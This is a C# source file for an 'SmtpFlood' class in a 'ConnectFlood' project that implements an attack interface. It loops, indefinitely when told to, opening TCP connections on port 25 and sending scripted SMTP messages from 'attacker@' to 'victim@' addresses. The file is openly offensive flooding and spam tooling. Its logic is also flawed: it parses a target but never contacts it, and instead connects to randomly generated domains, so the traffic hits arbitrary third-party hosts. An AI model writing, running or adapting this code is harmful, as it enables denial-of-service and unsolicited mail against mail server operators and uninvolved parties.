using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ConnectFlood
{
    public class SmtpFlood : IAttack
    {
        private static readonly string[] Domains = { "com", "net", "org", "info", "xyz", "io" };
        private static readonly Random RandomGen = new Random();

        public void StartFlood(string target, int packetCount, int speed, string message)
        {
            string host = target;
            int port = 25;

            Uri targetUri;
            if (Uri.TryCreate(target, UriKind.Absolute, out targetUri))
            {
                host = targetUri.Host;
            }
            else if (target.Contains(":"))
            {
                var splitTarget = target.Split(':');
                host = splitTarget[0];
            }

            Console.WriteLine($"[SMTP] Attacking {host} | Packets: {(packetCount == -1 ? "∞" : packetCount.ToString())} | Speed: {speed}ms | Port: {port}");

            int sentPackets = 0;

            while (packetCount == -1 || sentPackets < packetCount)
            {
                try
                {
                    string randomDomain = GenerateRandomDomain();
                    IPAddress ipAddr;

                    try
                    {
                        ipAddr = Dns.GetHostEntry(randomDomain).AddressList[0];
                    }
                    catch
                    {
                        Console.WriteLine($"[SMTP] Failed to resolve {randomDomain}, skipping...");
                        continue;
                    }

                    IPEndPoint smtpServer = new IPEndPoint(ipAddr, port);

                    using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                    {
                        socket.Connect(smtpServer);
                        byte[] smtpRequest = GenerateSmtpRequest(randomDomain, message);
                        socket.Send(smtpRequest);

                        Console.WriteLine($"[SMTP] Packet {sentPackets + 1} sent to {randomDomain}:{port} with message: \"{message}\"");
                    }

                    sentPackets++;
                    Thread.Sleep(speed);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[SMTP] Error: {ex.Message}");
                }
            }

            Console.WriteLine("[SMTP] Attack finished.");
        }

        private string GenerateRandomDomain()
        {
            string randomString = Guid.NewGuid().ToString("N").Substring(0, 8);
            string randomExtension = Domains[RandomGen.Next(Domains.Length)];
            return $"{randomString}.{randomExtension}";
        }

        private byte[] GenerateSmtpRequest(string domain, string message)
        {
            string request = $"EHLO {domain}\r\n" +
                             $"MAIL FROM:<attacker@{domain}>\r\n" +
                             $"RCPT TO:<victim@{domain}>\r\n" +
                             "DATA\r\n" +
                             $"Subject: SMTP Attack Test\r\n" +
                             "\r\n" +
                             $"{message}\r\n" +
                             ".\r\n";

            return Encoding.ASCII.GetBytes(request);
        }
    }
}
